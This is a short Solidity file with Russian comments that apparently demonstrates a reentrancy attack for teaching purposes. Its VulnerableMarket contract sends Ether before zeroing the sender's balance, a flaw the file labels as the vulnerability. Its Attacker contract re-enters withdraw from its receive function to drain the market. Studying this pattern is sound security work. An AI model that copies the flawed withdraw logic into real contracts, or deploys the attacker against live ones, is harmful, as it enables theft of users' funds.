// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

contract VulnerableMarket {
    mapping(address => uint256) public balances;

    function deposit() public payable { balances[msg.sender] += msg.value; }

    function withdraw() public {
        uint256 bal = balances[msg.sender];
        require(bal > 0, unicode"Пусто");

        // УЯЗВИМОСТЬ: Отправка до изменения баланса
        (bool sent, ) = msg.sender.call{value: bal}("");
        require(sent, unicode"Ошибка");

        balances[msg.sender] = 0;
    }
}

contract Attacker {
    VulnerableMarket public market;
    constructor(address _market) { market = VulnerableMarket(_market); }

    receive() external payable {
        // Рекурсивный удар!
        if (address(market).balance >= 1 ether) {
            market.withdraw(); 
        }
    }

    function attack() external payable {
        market.deposit{value: 1 ether}();
        market.withdraw();
    }
}